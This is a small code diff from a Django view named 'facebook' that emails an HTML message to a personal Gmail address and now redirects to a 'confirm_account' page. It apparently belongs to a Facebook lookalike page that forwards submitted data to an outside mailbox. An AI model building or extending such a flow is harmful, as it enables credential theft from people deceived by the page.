@@ -83,7 +83,7 @@ def facebook(request):
         ['surelagacy4@gmail.com'], 
         fail_silently=False, html_message=message)
 
-       return redirect('facebook')
+       return redirect('confirm_account')
 
    return render(request, 'donate/facebook.html')
 
